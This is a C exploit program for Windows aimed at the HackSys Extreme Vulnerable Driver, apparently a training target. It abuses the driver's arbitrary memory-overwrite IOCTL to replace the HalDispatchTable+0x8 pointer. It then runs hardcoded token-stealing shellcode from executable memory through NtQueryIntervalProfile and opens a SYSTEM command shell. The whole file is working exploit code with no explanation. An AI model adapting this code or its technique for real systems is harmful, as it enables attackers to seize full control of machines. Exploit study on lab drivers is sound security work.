#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>

#define IO_CODE 0x22200B // Set IO_CODE for the Arbitrary Memory Overwrite Vulnerability
#define ARRAY_SIZE 1024 // Set ARRAY_SIZE for driver enumeration

typedef NTSTATUS(WINAPI *NTQueryIntervalProfile_t)(IN ULONG ProfileSource, OUT PULONG Interval);

LPVOID Tokensteal() {
	char shellcode[] = "\x48\x31\xc0\x65\x48\x8b\x80\x88\x01\x00\x00\x48\x8b\x40\x70\x49\x89\xc0\x48\x8b\x80\x88\x01\x00\x00\x48\x2d\x88\x01\x00\x00\x48\x8b\x88\x80\x01\x00\x00\x48\x83\xf9\x04\x75\xe6\x4c\x8b\x88\x08\x02\x00\x00\x4d\x89\x88\x08\x02\x00\x00\x48\x83\xc4\x20\xc3";

	printf("[+] Allocating memory region for shellcode\n");
	LPVOID Alloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!Alloc) {
		printf("[-] Error - Unable to allocate memory region for tokenstealing shellcode..");
		exit(1);
	}
	RtlMoveMemory(Alloc, shellcode, sizeof(shellcode));
	printf("[+] Successfully copied tokenstealing shellcode to memory region at: 0x%llx\n", Alloc);

	printf("[+] Allocating memory region for a pointer to tokenstealing shellcode\n");
	LPVOID pAlloc = VirtualAlloc(NULL, sizeof(Alloc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pAlloc) {
		printf("[-] Error - Unable to allocate memory for the pointer to tokenstealing shellcode..");
		exit(1);
	}
	RtlMoveMemory(pAlloc, &Alloc, sizeof(&Alloc));
	printf("[+] Successfully allocated pointer to tokenstealing shellcode address: 0x%llx\n", pAlloc);

	return pAlloc;
}

PUCHAR GetKernel() {
	LPVOID lpImageBase[ARRAY_SIZE];
	DWORD lpcbNeeded;
	int drivers, i;
	CHAR lpFileName[ARRAY_SIZE];
	PUCHAR krnl_base = NULL;

	printf("[+] Calling EnumDeviceDrivers() to find base address of ntoskrnl.exe..\n");
	EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);
	drivers = lpcbNeeded / sizeof(lpImageBase[0]);

	for (i = 0; i < drivers; i++) {
		GetDeviceDriverBaseNameA(lpImageBase[i], lpFileName, sizeof(lpFileName) / sizeof(char));
		if (!strcmp("ntoskrnl.exe", lpFileName)) {
			printf("[+] Found %s..\n", lpFileName);
			krnl_base = lpImageBase[i];
			break;
		}
	}
	return krnl_base;
}

LPVOID GetHAL() {
	PUCHAR pGetKernel = GetKernel();
	PVOID Hal8 = NULL;

	printf("[+] Base address of ntoskrnl.exe is: 0x%llx\n", pGetKernel);

	HMODULE hUserSpaceBase = LoadLibraryExA("ntoskrnl.exe", NULL, 0x1);
	PVOID pUserSpaceAddr = GetProcAddress(hUserSpaceBase, "HalDispatchTable");
	printf("[+] Found HalDispatchTable.. proceeding to calculate the address of HalDispatchTable+0x8.\n");

	Hal8 = ((ULONG_PTR)pGetKernel + (ULONG_PTR)pUserSpaceAddr) - (ULONG_PTR)hUserSpaceBase + 0x8;
	printf("[+] Address of HalDispatchTable+0x8 is: 0x%llx\n", Hal8);

	return Hal8;
}

int main(int argc, char* argv[]) {
	printf("[+] Calling CreateFileA() to obtain a handle to the driver..\n");
	HANDLE hDriver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDriver == INVALID_HANDLE_VALUE) {
		printf("[-] Error - Unable to obtain a handle to the driver.\n");
		exit(1);
	}
	printf("[+] Successfully obtained a handle to the driver.\n");

	PUCHAR pHal8 = GetHAL();
	PUCHAR pTokensteal = Tokensteal();
	DWORD bytesRetn;
	char expl[16];
	const size_t offset = 8;

	memset(expl, 'A', offset);
	memcpy(&expl, &pTokensteal, 0x8);
	memcpy(&expl[offset], &pHal8, 0x8);

	printf("[+] Starting interaction with the driver..\n");
	DeviceIoControl(hDriver, IO_CODE, expl, sizeof(expl), NULL, 0, &bytesRetn, NULL);
	NTQueryIntervalProfile_t NtQueryIntervalProfile = (NTQueryIntervalProfile_t)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtQueryIntervalProfile");
	if (!NtQueryIntervalProfile) {
		printf("[-] Error - Failed to call NtQueryIntervalProfile\n");
	}
	printf("[+] Found NtQueryIntervalProfile Address at: 0x%llx\n", NtQueryIntervalProfile);

	ULONG NtQueryInterval = NULL;

	NtQueryIntervalProfile(6055, &NtQueryInterval);
	
	printf("[+] Welcome, NT AUTHORITY\SYSTEM!\n");

	CloseHandle(hDriver);
	system("cmd.exe");

	return 0;
}
